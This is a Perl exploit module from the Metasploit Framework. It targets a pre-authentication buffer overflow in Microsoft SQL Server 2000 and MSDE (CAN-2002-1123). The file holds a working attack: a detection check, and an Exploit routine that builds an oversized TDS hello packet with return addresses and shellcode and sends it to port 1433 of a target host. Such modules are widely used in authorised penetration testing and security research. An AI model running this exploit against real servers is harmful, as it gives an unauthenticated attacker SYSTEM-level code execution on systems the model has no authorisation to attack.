##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mssql2000_preauthentication;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };
my $info =
{
    'Name'  => 'Microsoft SQL Server Hello Buffer Overflow',
    'Version'  => '$Revision: 1.1 $',
    'Authors' => [ 'y0@w00t-shell.net', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 1433],
                },
    'AutoOpts' => { 'EXITFUNC' => 'seh' },
    'Payload'  => {
                 'Space'  => 512,
                 'BadChars'  => "\x00",
               },
    
    'Description'  => Pex::Text::Freeform(qq{
        By sending malformed data to TCP port 1433, an unauthenticated 
        remote attacker could overflow a buffer and possibly execute code 
        on the server with SYSTEM level privileges. This module should 
        work against any vulnerable SQL Server 2000 or MSDE install (< SP3).
    }),         
    'Refs'  =>  [  
                    'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2002-1123',
                    'http://www.immunitysec.com/#werd+to+Dave+Aitel',
                    
                ],
    'DefaultTarget' => 0,
    'Targets' => [['Microsoft SQL Server 2000 / MSDE 2000 ',   0x42b68aba, 0x42d01e50]],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}


sub Check {
    my $self = shift;
    my %r = Pex::MSSQL::Ping($self->GetVar('RHOST'), $self->GetVar('RPORT'));
    
    if (! keys(%r)) {
        $self->PrintLine("[*] No response recieved from SQL server");
        return $self->CheckCode('Safe');
    }
    
    $self->PrintLine("SQL Server '". $r{'ServerName'} ."' on port ". $r{'tcp'});
    return $self->CheckCode('Detected');
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');    
    my $shellcode   =$self->GetVar('EncodedPayload')->Payload;
    
    my $target = $self->Targets->[$target_idx];

    $self->PrintLine(sprintf("[*] Saying hello to %s (0x%.8x / 0x%.8x)", $target->[0], $target->[1], $target->[2]));
    

    my $request = "\x12\x01\x00\x34\x00\x00\x00\x00\x00\x00\x15\x00\x06\x01\x00\x1b".
                  "\x00\x01\x02\x00\x1c\x00\x0c\x03\x00\x28\x00\x04\xff\x08\x00\x02".
                  "\x10\x00\x00\x00" . 
                  ("M" x 528) . "\x1B\xA5\xEE\x34" . "CCCC" . 
                  pack('V', $target->[1]).
                  pack('V', $target->[2]).
                  pack('V', $target->[2]).
                  "3333".
                  pack('V', $target->[2]).
                  pack('V', $target->[2]).
                  ("\x41" x 88) . $shellcode . 
                  "\x00\x24\x01\x00\x00";
    

    my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $target_port, 
        'LocalPort' => $self->GetVar('CPORT'),
    );
    if ($s->IsError) {
      $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
      return;
    }

    $s->Send($request); 
    
    sleep(1);
    return;
}



